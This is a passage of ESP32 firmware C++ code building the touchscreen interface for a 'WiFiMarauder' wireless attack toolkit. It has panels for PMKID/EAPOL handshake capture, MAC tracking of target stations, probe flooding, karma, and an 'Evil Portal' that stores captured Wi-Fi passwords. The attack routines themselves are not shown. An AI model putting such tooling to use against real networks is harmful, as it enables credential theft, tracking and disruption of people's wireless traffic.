    lv_obj_add_event_cb(mar.btn_sig_refresh, mar_event_sig_refresh, LV_EVENT_CLICKED, NULL);

    mar.lbl_sig_status = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_sig_status, 2, 32);
    lv_obj_set_width(mar.lbl_sig_status, 310);
    lv_label_set_text(mar.lbl_sig_status, "Refresh after AP scan");
    lv_obj_set_style_text_color(mar.lbl_sig_status, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.lbl_sig_status, &lv_font_montserrat_14, 0);

    mar.chart_sig = lv_chart_create(t);
    lv_obj_set_size(mar.chart_sig, 312, 200);
    lv_obj_set_pos(mar.chart_sig, 2, 50);
    lv_obj_set_style_bg_color(mar.chart_sig, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.chart_sig, lv_color_hex(0x222244), 0);
    lv_chart_set_type(mar.chart_sig, LV_CHART_TYPE_BAR);
    // Pre-allocate 20 points (matches refresh max). Setting count=1 +
    // adding a series caused the chart's first render to read uninitialised
    // point memory; that's the crash on SIG/CH/OPS tab clicks.
    lv_chart_set_point_count(mar.chart_sig, 20);
    lv_chart_set_range(mar.chart_sig, LV_CHART_AXIS_PRIMARY_Y, 0, 70);
    lv_chart_set_div_line_count(mar.chart_sig, 4, 0);
    mar.ser_sig = lv_chart_add_series(mar.chart_sig, lv_color_hex(MAR_ACCENT),
                                      LV_CHART_AXIS_PRIMARY_Y);
    // Pre-fill so first render has valid point data
    for (int i = 0; i < 20; i++)
        lv_chart_set_value_by_id(mar.chart_sig, mar.ser_sig, i, 0);
}

// ============================================================
// CHANNEL ANALYZER TAB — 1-14 histogram
// ============================================================
static void mar_event_chan_toggle(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState == MAR_STATE_CHANANA) {
        WiFiMarauder::stopChannelAnalyzer();
        WiFiMarauder::deinit();
        currentState = MAR_STATE_IDLE;
        lv_label_set_text(mar.lbl_chan_status, "Stopped");
        lv_obj_set_style_text_color(mar.lbl_chan_status, lv_color_hex(MAR_DIM), 0);
    } else if (currentState == MAR_STATE_IDLE) {
        WiFiMarauder::init();
        WiFiMarauder::startChannelAnalyzer();
        lv_label_set_text(mar.lbl_chan_status, "Sweeping 1-14...");
        lv_obj_set_style_text_color(mar.lbl_chan_status, lv_color_hex(MAR_GREEN), 0);
        currentState = MAR_STATE_CHANANA;
    }
}
static void marauder_tab_chanana_build() {
    lv_obj_t *t = mar.tab_chanana;
    lv_obj_clear_flag(t, LV_OBJ_FLAG_SCROLLABLE);

    mar.btn_chan_toggle = lv_btn_create(t);
    lv_obj_set_size(mar.btn_chan_toggle, 110, 26);
    lv_obj_set_pos(mar.btn_chan_toggle, 2, 2);
    mar_style_btn(mar.btn_chan_toggle, 0x004422, MAR_GREEN, ">" " START");
    lv_obj_add_event_cb(mar.btn_chan_toggle, mar_event_chan_toggle, LV_EVENT_CLICKED, NULL);

    mar.lbl_chan_status = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_chan_status, 116, 8);
    lv_label_set_text(mar.lbl_chan_status, "Stopped");
    lv_obj_set_style_text_color(mar.lbl_chan_status, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.lbl_chan_status, &lv_font_montserrat_14, 0);

    lv_obj_t *axis = lv_label_create(t);
    lv_obj_set_pos(axis, 2, 240);
    lv_label_set_text(axis, "Ch: 1  2  3  4  5  6  7  8  9 10 11 12 13 14");
    lv_obj_set_style_text_color(axis, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(axis, &lv_font_montserrat_14, 0);

    mar.chart_chan = lv_chart_create(t);
    lv_obj_set_size(mar.chart_chan, 312, 200);
    lv_obj_set_pos(mar.chart_chan, 2, 36);
    lv_obj_set_style_bg_color(mar.chart_chan, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.chart_chan, lv_color_hex(0x222244), 0);
    lv_chart_set_type(mar.chart_chan, LV_CHART_TYPE_BAR);
    lv_chart_set_point_count(mar.chart_chan, 14);
    lv_chart_set_range(mar.chart_chan, LV_CHART_AXIS_PRIMARY_Y, 0, 100);
    lv_chart_set_div_line_count(mar.chart_chan, 4, 0);
    mar.ser_chan = lv_chart_add_series(mar.chart_chan, lv_color_hex(MAR_CYAN),
                                       LV_CHART_AXIS_PRIMARY_Y);
    for (int i = 0; i < 14; i++)
        lv_chart_set_value_by_id(mar.chart_chan, mar.ser_chan, i, 0);
}

// ============================================================
// Per-state update callbacks — called from main.cpp loop()
// already holding lvgl_mutex.
// ============================================================
static void marauder_update_pktgraph_locked() {
    if (!mar.chart_pkt) return;
    uint32_t m = WiFiMarauder::pktMgmt;
    uint32_t d = WiFiMarauder::pktData;
    uint32_t p = WiFiMarauder::probeCount;
    int dm = (int)(m - mar.last_mgmt);
    int dd = (int)(d - mar.last_data);
    int dp = (int)(p - mar.last_probe);
    mar.last_mgmt = m; mar.last_data = d; mar.last_probe = p;
    if (dm < 0) dm = 0; if (dd < 0) dd = 0; if (dp < 0) dp = 0;
    // Auto-scale Y range
    int mx = dm; if (dd > mx) mx = dd; if (dp > mx) mx = dp;
    int range = mx < 50 ? 50 : ((mx / 50 + 1) * 50);
    lv_chart_set_range(mar.chart_pkt, LV_CHART_AXIS_PRIMARY_Y, 0, range);
    lv_chart_set_next_value(mar.chart_pkt, mar.ser_mgmt,  dm);
    lv_chart_set_next_value(mar.chart_pkt, mar.ser_data,  dd);
    lv_chart_set_next_value(mar.chart_pkt, mar.ser_probe, dp);
}

static void marauder_update_chananalyzer_locked() {
    if (!mar.chart_chan) return;
    uint32_t mx = 1;
    for (int i = 1; i <= 14; i++)
        if (WiFiMarauder::chanPktCount[i] > mx) mx = WiFiMarauder::chanPktCount[i];
    // Scale to 0..100 range
    for (int i = 1; i <= 14; i++) {
        int v = (int)((WiFiMarauder::chanPktCount[i] * 100ULL) / mx);
        lv_chart_set_value_by_id(mar.chart_chan, mar.ser_chan, i - 1, v);
    }
    lv_chart_refresh(mar.chart_chan);
    char buf[64];
    snprintf(buf, sizeof(buf), "Scan ch%d  max=%lu pkts",
             WiFiMarauder::analyzerCurrentChan(), (unsigned long)mx);
    lv_label_set_text(mar.lbl_chan_status, buf);
}

static void marauder_update_pmkid_locked() {
    if (!mar.lbl_pmkid_count) return;
    char buf[32];
    snprintf(buf, sizeof(buf), "PMKIDs: %d", WiFiMarauder::pmkidCount);
    lv_label_set_text(mar.lbl_pmkid_count, buf);
    snprintf(buf, sizeof(buf), "EAPOL: %d", WiFiMarauder::eapolCount);
    lv_label_set_text(mar.lbl_eapol_count, buf);
    // Render log
    static int lastLogged = 0;
    while (lastLogged < WiFiMarauder::pmkidCount) {
        const auto &p = WiFiMarauder::pmkids[lastLogged];
        char line[120];
        char mac_ap[20];
        mar_fmt_mac(mac_ap, sizeof(mac_ap), p.mac_ap);
        snprintf(line, sizeof(line), "%s %.16s\n", mac_ap,
                 p.ssid[0] ? p.ssid : "(unknown)");
        const char *curText = lv_textarea_get_text(mar.txt_pmkid_log);
        if (curText && strlen(curText) > 2000) {
            lv_textarea_set_text(mar.txt_pmkid_log, "");
        }
        lv_textarea_add_text(mar.txt_pmkid_log, line);
        lastLogged++;
    }
}

static void marauder_update_stascan_locked() {
    char buf[64];
    snprintf(buf, sizeof(buf), "Scanning AP %d/%d ch%d - %d stations",
             WiFiMarauder::stationScanProgress() + 1, WiFiMarauder::targetCount,
             WiFiMarauder::sniffChannel, WiFiMarauder::stationCount);
    if (mar.lbl_tg_status) lv_label_set_text(mar.lbl_tg_status, buf);
}

// ============================================================
// OPS TAB — sub-panel switcher for extended features
// ============================================================
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include "ping/ping_sock.h"

// ---- Forward decls for OPS panel builders ----
static void mar_build_pwn_panel();
static void mar_build_mac_panel();
static void mar_build_probe_panel();
static void mar_build_raw_panel();
static void mar_build_karma_panel();
static void mar_build_assoc_panel();
static void mar_build_bad_panel();
static void mar_build_sae_panel();
static void mar_build_ping_panel();
static void mar_build_portal_panel();

// ---- Ping Scan globals ----
struct PingHit { uint32_t ip; uint32_t rtt_ms; };
static const int PING_MAX = 64;
static PingHit pingHits[PING_MAX];
static volatile int pingHitCount;
static volatile int pingNextHost;   // 1..254
static volatile bool pingScanRunning;
static volatile bool pingDirty;      // flag for UI update
static esp_ping_handle_t pingHandle = nullptr;

// ---- Evil Portal globals ----
static AsyncWebServer *portalServer = nullptr;
static DNSServer    *portalDNS    = nullptr;
static const int    PORTAL_CRED_MAX = 8;
struct PortalCred {
    char ssid[33];
    char pass[65];
    uint32_t millis_seen;
};
static PortalCred portalCreds[PORTAL_CRED_MAX];
static volatile int portalCredCount;
static volatile bool portalDirty;
static volatile bool portalRunning;

// Karma-clone phase active when running beacon broadcast
static volatile bool karmaCloneActive;

// ===== Panel switch helpers =====
static void mar_ops_show_panel(lv_obj_t *panel) {
    lv_obj_add_flag(mar.ops_menu, LV_OBJ_FLAG_HIDDEN);
    for (lv_obj_t *p : { mar.ops_pwn, mar.ops_mac, mar.ops_probe, mar.ops_raw,
                         mar.ops_karma, mar.ops_assoc, mar.ops_bad, mar.ops_sae,
                         mar.ops_ping, mar.ops_portal }) {
        if (p) lv_obj_add_flag(p, LV_OBJ_FLAG_HIDDEN);
    }
    if (panel) lv_obj_clear_flag(panel, LV_OBJ_FLAG_HIDDEN);
}
static void mar_ops_show_menu() {
    for (lv_obj_t *p : { mar.ops_pwn, mar.ops_mac, mar.ops_probe, mar.ops_raw,
                         mar.ops_karma, mar.ops_assoc, mar.ops_bad, mar.ops_sae,
                         mar.ops_ping, mar.ops_portal }) {
        if (p) lv_obj_add_flag(p, LV_OBJ_FLAG_HIDDEN);
    }
    lv_obj_clear_flag(mar.ops_menu, LV_OBJ_FLAG_HIDDEN);
}

// ===== Stop helpers =====
static void mar_stop_all_ops() {
    WiFiMarauder::stopMacTrack();
    WiFiMarauder::stopProbeFlood();
    WiFiMarauder::stopRawSniff();
    WiFiMarauder::stopKarmaListen();
    WiFiMarauder::stopAssocSleep();
    WiFiMarauder::stopBadMsg();
    WiFiMarauder::stopSae();
    karmaCloneActive = false;
    if (pingScanRunning && pingHandle) {
        esp_ping_stop(pingHandle);
        esp_ping_delete_session(pingHandle);
        pingHandle = nullptr;
    }
    pingScanRunning = false;
    if (portalRunning) {
        if (portalServer) { portalServer->end(); delete portalServer; portalServer = nullptr; }
        if (portalDNS)    { portalDNS->stop();    delete portalDNS;    portalDNS    = nullptr; }
        WiFi.softAPdisconnect(true);
        portalRunning = false;
    }
    WiFiMarauder::deinit();
}

// ============================================================
// OPS TAB BUILD — menu + all sub-panels
// ============================================================
static void mar_ops_menu_cb(lv_event_t *e) {
    int sel = (int)(intptr_t)lv_event_get_user_data(e);
    lv_obj_t *panel = nullptr;
    switch (sel) {
        case 0: panel = mar.ops_pwn;    break;
        case 1: panel = mar.ops_mac;    break;
        case 2: panel = mar.ops_probe;  break;
        case 3: panel = mar.ops_raw;    break;
        case 4: panel = mar.ops_karma;  break;
        case 5: panel = mar.ops_assoc;  break;
        case 6: panel = mar.ops_bad;    break;
        case 7: panel = mar.ops_sae;    break;
        case 8: panel = mar.ops_ping;   break;
        case 9: panel = mar.ops_portal; break;
    }
    if (panel) mar_ops_show_panel(panel);
}
static void mar_ops_panel_back_cb(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) {
        mar_stop_all_ops();
        currentState = MAR_STATE_IDLE;
    }
    mar_ops_show_menu();
}

// Each sub-panel: 314x256 container, top button row, status area.
// Helper to create a standard panel skeleton with title + back button.
static lv_obj_t *mar_make_panel(lv_obj_t *parent, const char *title) {
    lv_obj_t *p = lv_obj_create(parent);
    lv_obj_set_size(p, 314, 256);
    lv_obj_set_pos(p, 0, 0);
    lv_obj_set_style_bg_color(p, lv_color_hex(MAR_BG), 0);
    lv_obj_set_style_border_width(p, 0, 0);
    lv_obj_set_style_pad_all(p, 2, 0);
    lv_obj_clear_flag(p, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(p, LV_OBJ_FLAG_HIDDEN);

    lv_obj_t *btnBack = lv_btn_create(p);
    lv_obj_set_size(btnBack, 50, 22);
    lv_obj_set_pos(btnBack, 0, 0);
    mar_style_btn(btnBack, 0x222244, 0xFFFFFF, "<");
    lv_obj_add_event_cb(btnBack, mar_ops_panel_back_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *lblTitle = lv_label_create(p);
    lv_obj_set_pos(lblTitle, 56, 4);
    lv_label_set_text(lblTitle, title);
    lv_obj_set_style_text_color(lblTitle, lv_color_hex(MAR_ACCENT), 0);
    lv_obj_set_style_text_font(lblTitle, &lv_font_montserrat_14, 0);

    return p;
}

static void marauder_tab_ops_build() {
    lv_obj_t *t = mar.tab_ops;
    lv_obj_clear_flag(t, LV_OBJ_FLAG_SCROLLABLE);

    // Menu panel — 10 buttons in 2 columns
    mar.ops_menu = lv_obj_create(t);
    lv_obj_set_size(mar.ops_menu, 314, 256);
    lv_obj_set_pos(mar.ops_menu, 0, 0);
    lv_obj_set_style_bg_color(mar.ops_menu, lv_color_hex(MAR_BG), 0);
    lv_obj_set_style_border_width(mar.ops_menu, 0, 0);
    lv_obj_set_style_pad_all(mar.ops_menu, 2, 0);
    lv_obj_clear_flag(mar.ops_menu, LV_OBJ_FLAG_SCROLLABLE);

    const char *labels[10] = {
        "PWN",      "MAC TRK",
        "PROBE FL", "RAW SNF",
        "KARMA",    "ASSOC SLP",
        "BAD MSG",  "SAE",
        "PING",     "PORTAL"
    };
    uint32_t colors[10] = {
        0x553388, 0x113355,
        0x884422, 0x224488,
        0x885511, 0x551133,
        0x882233, 0x335588,
        0x115544, 0x442288
    };
    for (int i = 0; i < 10; i++) {
        int col = i % 2;
        int row = i / 2;
        lv_obj_t *b = lv_btn_create(mar.ops_menu);
        lv_obj_set_size(b, 150, 44);
        lv_obj_set_pos(b, col * 154 + 2, row * 48 + 2);
        mar_style_btn(b, colors[i], 0xFFFFFF, labels[i]);
        lv_obj_add_event_cb(b, mar_ops_menu_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }

    mar_build_pwn_panel();
    mar_build_mac_panel();
    mar_build_probe_panel();
    mar_build_raw_panel();
    mar_build_karma_panel();
    mar_build_assoc_panel();
    mar_build_bad_panel();
    mar_build_sae_panel();
    mar_build_ping_panel();
    mar_build_portal_panel();
}

// ============================================================
// PWN (Pwnagotchi viewer) — pure detection display
// ============================================================
static void mar_event_pwn_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    WiFiMarauder::init();
    // Use sniff infra to channel hop and accumulate detections
    WiFiMarauder::startSniff();
    lv_label_set_text(mar.pwn_lbl, "Sniffing for PWNAGOTCHIs...");
    lv_obj_set_style_text_color(mar.pwn_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_PWN;
}
static void mar_event_pwn_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopSniff();
    WiFiMarauder::deinit();
    lv_label_set_text(mar.pwn_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.pwn_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_pwn_panel() {
    mar.ops_pwn = mar_make_panel(mar.tab_ops, "PWNAGOTCHI");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_pwn);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "START");
    lv_obj_add_event_cb(btnStart, mar_event_pwn_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_pwn);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_pwn_stop, LV_EVENT_CLICKED, NULL);

    mar.pwn_lbl = lv_label_create(mar.ops_pwn);
    lv_obj_set_pos(mar.pwn_lbl, 0, 28);
    lv_obj_set_width(mar.pwn_lbl, 310);
    lv_label_set_text(mar.pwn_lbl, "Idle - press START");
    lv_obj_set_style_text_color(mar.pwn_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.pwn_lbl, &lv_font_montserrat_14, 0);

    mar.pwn_list = lv_list_create(mar.ops_pwn);
    lv_obj_set_size(mar.pwn_list, 310, 198);
    lv_obj_set_pos(mar.pwn_list, 0, 46);
    lv_obj_set_style_bg_color(mar.pwn_list, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.pwn_list, lv_color_hex(0x222244), 0);
    lv_obj_set_style_border_width(mar.pwn_list, 1, 0);
    lv_obj_set_style_pad_all(mar.pwn_list, 2, 0);
}
static void marauder_update_pwn_locked() {
    if (!mar.pwn_list) return;
    static int lastSeen = -1;
    int cur = WiFiMarauder::pwnWriteIdx;
    if (cur == lastSeen) {
        // still update header
    } else {
        lastSeen = cur;
        lv_obj_clean(mar.pwn_list);
        int n = cur > WiFiMarauder::PWN_BUF_SIZE ? WiFiMarauder::PWN_BUF_SIZE : cur;
        for (int i = 0; i < n; i++) {
            int idx = ((cur - 1 - i) % WiFiMarauder::PWN_BUF_SIZE + WiFiMarauder::PWN_BUF_SIZE)
                       % WiFiMarauder::PWN_BUF_SIZE;
            const auto &p = WiFiMarauder::pwnList[idx];
            char mac[20], buf[100];
            mar_fmt_mac(mac, sizeof(mac), p.bssid);
            uint32_t age = (uint32_t)millis() - p.millis_seen;
            snprintf(buf, sizeof(buf), "%s ch%d %ddBm %lus\n%.32s",
                     mac, p.channel, p.rssi, (unsigned long)(age / 1000),
                     p.ssid[0] ? p.ssid : "(none)");
            lv_obj_t *btn = lv_list_add_btn(mar.pwn_list, NULL, buf);
            lv_obj_set_style_bg_color(btn, lv_color_hex(MAR_PANEL), 0);
            lv_obj_set_style_text_color(btn, lv_color_hex(0xCCCCCC), 0);
            lv_obj_set_style_text_font(btn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_pad_all(btn, 3, 0);
        }
    }
    char st[64];
    snprintf(st, sizeof(st), "Total: %d  Last: %.20s  Ch:%d",
             WiFiMarauder::pwnagotchiCount,
             WiFiMarauder::pwnagotchiLastSSID[0] ? WiFiMarauder::pwnagotchiLastSSID : "-",
             WiFiMarauder::sniffChannel);
    lv_label_set_text(mar.pwn_lbl, st);
}

// ============================================================
// MAC TRACK — pick a station from saved list, plot RSSI
// ============================================================
static void mar_event_mac_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::targetStationCount == 0) {
        lv_label_set_text(mar.mac_lbl_status, "No saved stations - go to TGT");
        lv_obj_set_style_text_color(mar.mac_lbl_status, lv_color_hex(MAR_RED), 0);
        return;
    }
    int sel = lv_dropdown_get_selected(mar.mac_dd);
    if (sel < 0 || sel >= WiFiMarauder::targetStationCount) return;
    // Clear chart
    for (int i = 0; i < WiFiMarauder::MACTRACK_HIST; i++)
        lv_chart_set_value_by_id(mar.mac_chart, mar.mac_ser, i, 0);
    lv_chart_refresh(mar.mac_chart);
    WiFiMarauder::init();
    WiFiMarauder::startMacTrack(WiFiMarauder::targetStations[sel]);
    lv_label_set_text(mar.mac_lbl_status, "Tracking...");
    lv_obj_set_style_text_color(mar.mac_lbl_status, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_MACTRACK;
}
static void mar_event_mac_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopMacTrack();
    WiFiMarauder::deinit();
    lv_label_set_text(mar.mac_lbl_status, "Stopped");
    lv_obj_set_style_text_color(mar.mac_lbl_status, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_mac_panel() {
    mar.ops_mac = mar_make_panel(mar.tab_ops, "MAC TRACK");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_mac);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "TRACK");
    lv_obj_add_event_cb(btnStart, mar_event_mac_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_mac);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_mac_stop, LV_EVENT_CLICKED, NULL);

    mar.mac_dd = lv_dropdown_create(mar.ops_mac);
    lv_dropdown_set_symbol(mar.mac_dd, NULL);
    lv_obj_set_size(mar.mac_dd, 310, 24);
    lv_obj_set_pos(mar.mac_dd, 0, 30);
    lv_obj_set_style_bg_color(mar.mac_dd, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_text_color(mar.mac_dd, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_font(mar.mac_dd, &lv_font_montserrat_14, 0);
    lv_dropdown_set_options(mar.mac_dd, "(no targets)");

    mar.mac_lbl_status = lv_label_create(mar.ops_mac);
    lv_obj_set_pos(mar.mac_lbl_status, 0, 58);
    lv_obj_set_width(mar.mac_lbl_status, 310);
    lv_label_set_text(mar.mac_lbl_status, "Pick a station + TRACK");
    lv_obj_set_style_text_color(mar.mac_lbl_status, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.mac_lbl_status, &lv_font_montserrat_14, 0);

    mar.mac_chart = lv_chart_create(mar.ops_mac);
    lv_obj_set_size(mar.mac_chart, 310, 174);
    lv_obj_set_pos(mar.mac_chart, 0, 76);
    lv_obj_set_style_bg_color(mar.mac_chart, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.mac_chart, lv_color_hex(0x222244), 0);
    lv_chart_set_type(mar.mac_chart, LV_CHART_TYPE_LINE);
    lv_chart_set_point_count(mar.mac_chart, WiFiMarauder::MACTRACK_HIST);
    lv_chart_set_range(mar.mac_chart, LV_CHART_AXIS_PRIMARY_Y, -100, -20);
    lv_chart_set_div_line_count(mar.mac_chart, 4, 6);
    lv_obj_set_style_size(mar.mac_chart, 0, LV_PART_INDICATOR);
    mar.mac_ser = lv_chart_add_series(mar.mac_chart, lv_color_hex(MAR_GREEN),
                                      LV_CHART_AXIS_PRIMARY_Y);
}
static void mar_refresh_mac_dropdown() {
    if (!mar.mac_dd) return;
    String opts;
    for (int i = 0; i < WiFiMarauder::targetStationCount; i++) {
        char m[20];
        mar_fmt_mac(m, sizeof(m), WiFiMarauder::targetStations[i]);
        if (i) opts += "\n";
        opts += m;
    }
    if (opts.length() == 0) opts = "(no targets)";
    lv_dropdown_set_options(mar.mac_dd, opts.c_str());
}
static void marauder_update_mac_locked() {
    if (!mar.mac_chart) return;
    // Render the last MACTRACK_HIST RSSI readings
    int cnt = WiFiMarauder::mactrackWriteIdx;
    int n = cnt > WiFiMarauder::MACTRACK_HIST ? WiFiMarauder::MACTRACK_HIST : cnt;
    for (int i = 0; i < WiFiMarauder::MACTRACK_HIST; i++) {
        int8_t v = -100;
        if (i < n) {
            int idx = ((cnt - n + i) % WiFiMarauder::MACTRACK_HIST
                       + WiFiMarauder::MACTRACK_HIST) % WiFiMarauder::MACTRACK_HIST;
            v = WiFiMarauder::mactrackRSSI[idx];
        }
        lv_chart_set_value_by_id(mar.mac_chart, mar.mac_ser, i, v);
    }
    lv_chart_refresh(mar.mac_chart);
    char buf[80];
    uint32_t age = WiFiMarauder::mactrackLastSeen
                   ? (uint32_t)millis() - WiFiMarauder::mactrackLastSeen : 0;
    snprintf(buf, sizeof(buf), "Hits:%d LastCh:%d Age:%lus Cur:%d",
             WiFiMarauder::mactrackHits,
             WiFiMarauder::mactrackLastChan,
             (unsigned long)(age / 1000),
             WiFiMarauder::sniffChannel);
    lv_label_set_text(mar.mac_lbl_status, buf);
}

// ============================================================
// PROBE FLOOD — needs AP mode
// ============================================================
static void mar_event_probe_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    WiFiMarauder::initActive();
    WiFiMarauder::startProbeFlood();
    lv_label_set_text(mar.probe_lbl, "Flooding probes...");
    lv_obj_set_style_text_color(mar.probe_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_PROBEFLOOD;
}
static void mar_event_probe_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopProbeFlood();
    WiFiMarauder::deinitActive();
    lv_label_set_text(mar.probe_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.probe_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_probe_panel() {
    mar.ops_probe = mar_make_panel(mar.tab_ops, "PROBE FLOOD");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_probe);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "START");
    lv_obj_add_event_cb(btnStart, mar_event_probe_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_probe);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_probe_stop, LV_EVENT_CLICKED, NULL);

    mar.probe_lbl = lv_label_create(mar.ops_probe);
    lv_obj_set_pos(mar.probe_lbl, 0, 32);
    lv_obj_set_width(mar.probe_lbl, 310);
    lv_label_set_text(mar.probe_lbl, "Broadcasts 802.11 PROBE-REQs\nrandom + RickRoll + Funny.\nPress START.");
    lv_obj_set_style_text_color(mar.probe_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.probe_lbl, &lv_font_montserrat_14, 0);
}
static void marauder_update_probe_locked() {
    if (!mar.probe_lbl) return;
    char buf[80];
    snprintf(buf, sizeof(buf), "TX probes: %d\nRunning...", WiFiMarauder::probeFloodCount);
    lv_label_set_text(mar.probe_lbl, buf);
}

// ============================================================
// RAW SNIFF — header dump + SD save last 256
// ============================================================
static void mar_event_raw_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    WiFiMarauder::init();
    WiFiMarauder::startRawSniff();
    lv_label_set_text(mar.raw_lbl, "Sniffing...");
    lv_obj_set_style_text_color(mar.raw_lbl, lv_color_hex(MAR_GREEN), 0);
    lv_textarea_set_text(mar.raw_txt, "");
    mar.raw_lastSeen = 0;
    currentState = MAR_STATE_RAWSNIFF;
}
static void mar_event_raw_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopRawSniff();
    WiFiMarauder::deinit();
    lv_label_set_text(mar.raw_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.raw_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_event_raw_save(lv_event_t *e) {
    if (WiFiMarauder::rawSeen == 0) {
        lv_label_set_text(mar.raw_lbl, "Nothing to save");
        lv_obj_set_style_text_color(mar.raw_lbl, lv_color_hex(MAR_RED), 0);
        return;
    }
    if (!sd_card_is_present()) {
        lv_label_set_text(mar.raw_lbl, "SD missing");
        lv_obj_set_style_text_color(mar.raw_lbl, lv_color_hex(MAR_RED), 0);
        return;
    }
    if (!SD.exists("/mantis")) SD.mkdir("/mantis");
    char fname[64];
    snprintf(fname, sizeof(fname), "/mantis/rawsniff_%lu.bin", (unsigned long)millis());
    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        lv_label_set_text(mar.raw_lbl, "Open failed");
        now_close_sd_card();
        return;
    }
    int total = WiFiMarauder::rawWriteIdx;
    int n = total > WiFiMarauder::RAW_BUF_SIZE ? WiFiMarauder::RAW_BUF_SIZE : total;
    for (int i = 0; i < n; i++) {
        int idx = ((total - n + i) % WiFiMarauder::RAW_BUF_SIZE
                   + WiFiMarauder::RAW_BUF_SIZE) % WiFiMarauder::RAW_BUF_SIZE;
        const auto &r = WiFiMarauder::rawFrames[idx];
        f.write((const uint8_t*)&r, sizeof(r));
    }
    f.close();
    now_close_sd_card();
    char buf[80];
    snprintf(buf, sizeof(buf), "Saved %d frames to %s", n, fname);
    lv_label_set_text(mar.raw_lbl, buf);
    lv_obj_set_style_text_color(mar.raw_lbl, lv_color_hex(MAR_GREEN), 0);
}
static void mar_build_raw_panel() {
    mar.ops_raw = mar_make_panel(mar.tab_ops, "RAW SNIFF");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_raw);
    lv_obj_set_size(btnStart, 56, 22); lv_obj_set_pos(btnStart, 124, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "START");
    lv_obj_add_event_cb(btnStart, mar_event_raw_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_raw);
    lv_obj_set_size(btnStop, 56, 22); lv_obj_set_pos(btnStop, 184, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_raw_stop, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnSave = lv_btn_create(mar.ops_raw);
    lv_obj_set_size(btnSave, 56, 22); lv_obj_set_pos(btnSave, 244, 0);
    mar_style_btn(btnSave, 0x113355, MAR_CYAN, "SAVE");
    lv_obj_add_event_cb(btnSave, mar_event_raw_save, LV_EVENT_CLICKED, NULL);

    mar.raw_lbl = lv_label_create(mar.ops_raw);
